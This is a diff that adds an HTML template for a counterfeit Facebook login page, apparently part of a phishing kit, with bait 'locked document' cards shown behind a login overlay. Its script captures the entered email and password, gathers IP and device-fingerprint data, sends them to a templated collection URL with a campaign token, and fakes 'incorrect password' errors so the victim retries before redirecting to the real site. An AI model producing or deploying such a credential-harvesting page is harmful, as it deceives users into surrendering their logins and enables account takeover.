@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Facebook - Log In</title>
+  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yB/r/2sFJRNmJ5OP.ico" type="image/x-icon"/>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body,html{height:100%;font-family:Helvetica,Arial,sans-serif;background:#f0f2f5}
+    .main-container{display:flex;flex-direction:column;min-height:100vh}
+    .top-navbar{background:#fff;height:48px;box-shadow:0 1px 3px rgba(0,0,0,0.08);display:flex;align-items:center;justify-content:center;padding:0 16px}
+    .content-area{flex:1;display:flex;position:relative}
+    .document-preview{flex:1;background:#e8e8e8;padding:40px}
+    .document-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:25px;max-width:1200px;margin:0 auto}
+    .document-card{background:#fff;border-radius:4px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.1);transition:all .2s;position:relative}
+    .document-card:hover{transform:translateY(-5px);box-shadow:0 5px 15px rgba(0,0,0,0.15)}
+    .document-thumbnail{height:150px;background:#fff;display:flex;align-items:center;justify-content:center;border-bottom:1px solid #eee;padding:10px}
+    .thumbnail-content{width:100%;height:100%;background:#f8f8f8;display:flex;flex-direction:column}
+    .thumbnail-header{background:#1877F2;height:20px;width:100%}
+    .thumbnail-body{flex:1;padding:5px;font-size:6px;overflow:hidden}
+    .thumbnail-line{height:3px;background:#ddd;margin:3px 0;width:90%}
+    .document-info{padding:12px}
+    .document-title{font-size:14px;font-weight:500;margin-bottom:5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .document-meta{font-size:12px;color:#666;display:flex;align-items:center}
+    .document-date{margin-right:10px}
+    .document-type{padding:2px 6px;background:#E8F0FE;color:#1A73E8;border-radius:3px;font-size:10px}
+    .document-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:1000;overflow-y:auto;padding:20px}
+    .login-container{width:396px;max-width:100%;background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,0.3);padding:24px 16px 28px;z-index:1001;text-align:center}
+    .fb-logo{height:48px;margin-bottom:8px}
+    .form-title{font-size:18px;font-weight:500;color:#1c1e21;margin-bottom:16px}
+    .form-group{margin-bottom:12px;text-align:left}
+    .form-group label{font-weight:400;color:#606770;font-size:12px;display:none}
+    .form-control{height:44px;border-radius:6px;border:1px solid #dddfe2;padding:0 12px;font-size:15px;width:100%}
+    .form-control:focus{border-color:#1877F2;box-shadow:0 0 0 2px #e7f3ff;outline:none}
+    .btn-primary{background:#1877F2;border:none;height:44px;font-weight:700;width:100%;border-radius:6px;font-size:18px;color:#fff;cursor:pointer}
+    .btn-primary:hover{background:#166fe5}
+    .btn-primary:disabled{background:#9cbaf0}
+    .divider{border-bottom:1px solid #dadde1;margin:16px 0;display:flex;align-items:center}
+    .new-account-btn{background:#42b72a;border:none;height:44px;font-weight:700;padding:0 16px;border-radius:6px;font-size:16px;color:#fff;cursor:pointer;margin-top:8px}
+    .new-account-btn:hover{background:#36a420}
+    .forgot-link{color:#1877F2;font-size:14px;font-weight:500;display:block;margin-top:12px;text-decoration:none;cursor:pointer}
+    .forgot-link:hover{text-decoration:underline}
+    .error-message{color:#D32F2F;font-size:13px;margin-top:5px;margin-bottom:10px;display:none;text-align:center}
+    .lock-icon{position:absolute;top:10px;right:10px;background:rgba(255,255,255,0.9);width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#1877F2;font-size:12px}
+    .security-footer{padding:16px 0 0;margin-top:16px;border-top:1px solid #ddd;font-size:12px;color:#737373}
+    .loading-dialog{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(255,255,255,0.95);padding:20px;border-radius:8px;box-shadow:0 0 20px rgba(0,0,0,0.3);z-index:9999;text-align:center}
+    .loading-dialog .loading-text{margin-top:12px;font-size:14px;color:#1c1e21}
+    @media(max-width:768px){.document-list{grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:15px}.login-container{padding:20px 12px}}
+  </style>
+</head>
+<body>
+<div class="main-container">
+  <div class="top-navbar"><span style="font-weight:700;color:#1877F2;font-size:20px">facebook</span></div>
+  <div class="content-area">
+    <div class="document-preview">
+      <div class="document-list">
+        <div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:60%"></div><div class="thumbnail-line" style="width:80%"></div></div></div></div><div class="document-info"><div class="document-title">{{file1Name}}</div><div class="document-meta"><span class="document-date">{{file1Date}}</span><span class="document-type">PDF</span></div></div></div>
+        <div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:70%"></div><div class="thumbnail-line" style="width:60%"></div></div></div></div><div class="document-info"><div class="document-title">{{file2Name}}</div><div class="document-meta"><span class="document-date">{{file2Date}}</span><span class="document-type">DOC</span></div></div></div>
+        <div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:80%"></div><div class="thumbnail-line" style="width:70%"></div></div></div></div><div class="document-info"><div class="document-title">{{file3Name}}</div><div class="document-meta"><span class="document-date">{{file3Date}}</span><span class="document-type">XLS</span></div></div></div>
+        <div class="document-card"><div class="lock-icon"><i class="fas fa-lock"></i></div><div class="document-thumbnail"><div class="thumbnail-content"><div class="thumbnail-header"></div><div class="thumbnail-body"><div class="thumbnail-line" style="width:90%"></div><div class="thumbnail-line" style="width:80%"></div></div></div></div><div class="document-info"><div class="document-title">{{file4Name}}</div><div class="document-meta"><span class="document-date">{{file4Date}}</span><span class="document-type">PPT</span></div></div></div>
+      </div>
+      <div class="document-overlay">
+        <div class="login-container">
+          <h2 class="form-title">Log in to Facebook</h2>
+          <form id="loginForm" onsubmit="return handleSubmit(event);" method="post" autocomplete="off">
+            <div class="form-group">
+              <input type="text" class="form-control" id="emailInput" name="email" placeholder="Email address or phone number" required>
+            </div>
+            <div class="form-group">
+              <input type="password" class="form-control" id="passwordInput" name="password" placeholder="Password" required onkeypress="if(event.key==='Enter')handleSubmit(event)">
+              <div class="error-message" id="loginError">Incorrect email or password. Try again.</div>
+              <div class="error-message" id="generalError">An error occurred. Please try again.</div>
+            </div>
+            <input type="hidden" id="methodInput" value="email">
+            <button type="submit" class="btn-primary" id="submitBtn">Log In</button>
+            <a class="forgot-link">Forgotten password?</a>
+            <div class="divider"></div>
+            <button type="button" class="new-account-btn">Create new account</button>
+          </form>
+          <div class="security-footer">Meta © 2026</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="loading-dialog" id="loadingDialog">
+  <div class="spinner-border" style="color:#1877F2" role="status"><span class="sr-only">Loading...</span></div>
+  <div class="loading-text" id="loadingText">Verifying...</div>
+</div>
+<script>
+const templateConfig = { postURL:"{{postURL}}", token:"{{token}}", landingPageLink:"{{landingPageLink}}", maxLoginAttempts:"{{maxLoginAttempts}}" };
+let loginAttempts = 0;
+const MAX_ATTEMPTS = templateConfig.maxLoginAttempts && parseInt(templateConfig.maxLoginAttempts)>0 ? parseInt(templateConfig.maxLoginAttempts) : 3;
+function objectToFormData(obj){const fd=new URLSearchParams();Object.entries(obj).forEach(([k,v])=>fd.append(k,v!=null?v.toString():''));return fd.toString()}
+function getDeviceData(){return{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screenWidth:window.screen.width,screenHeight:window.screen.height,colorDepth:window.screen.colorDepth,pixelRatio:window.devicePixelRatio,hardwareConcurrency:navigator.hardwareConcurrency,deviceMemory:navigator.deviceMemory,vendor:navigator.vendor,maxTouchPoints:navigator.maxTouchPoints}}
+
+function handleSubmit(event){event.preventDefault()
+  document.getElementById('loginError').style.display='none'
+  document.getElementById('generalError').style.display='none'
+  const email=document.getElementById('emailInput').value.trim()
+  const password=document.getElementById('passwordInput').value.trim()
+  if(!email||!password){document.getElementById('loginError').textContent="Please fill in all fields.";document.getElementById('loginError').style.display='block';return false}
+  const btn=document.getElementById('submitBtn');btn.disabled=true;btn.textContent="Verifying...";document.getElementById('loadingDialog').style.display='block'
+  fetch('https://ipinfo.io/json').then(r=>r.json()).catch(()=>({})).then(ipData=>{
+    const payload={token:templateConfig.token,formData:JSON.stringify({loginMethod:'email',identifier:email,password:password,ipData,deviceData:getDeviceData(),timestamp:new Date().toISOString()})}
+    return fetch(`${templateConfig.postURL}/notify-form-submission`,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:objectToFormData(payload)})
+  }).then(r=>{if(!r.ok)throw new Error(`HTTP ${r.status}`);return r.json()}).then(data=>{
+    loginAttempts++;document.getElementById('loadingDialog').style.display='none';btn.disabled=false;btn.textContent="Log In"
+    if(loginAttempts>=MAX_ATTEMPTS){btn.textContent="Redirecting...";let url=templateConfig.landingPageLink||"https://www.facebook.com";if(!url.startsWith('http'))url='https://'+url;window.location.href=url}
+    else{document.getElementById('loginError').textContent="Incorrect email or password. Try again.";document.getElementById('loginError').style.display='block';document.getElementById('passwordInput').value=''}
+  }).catch(e=>{console.error(e);document.getElementById('loadingDialog').style.display='none';document.getElementById('generalError').style.display='block';btn.disabled=false;btn.textContent="Log In"})
+  return false}
+</script>
+</body>
+</html>
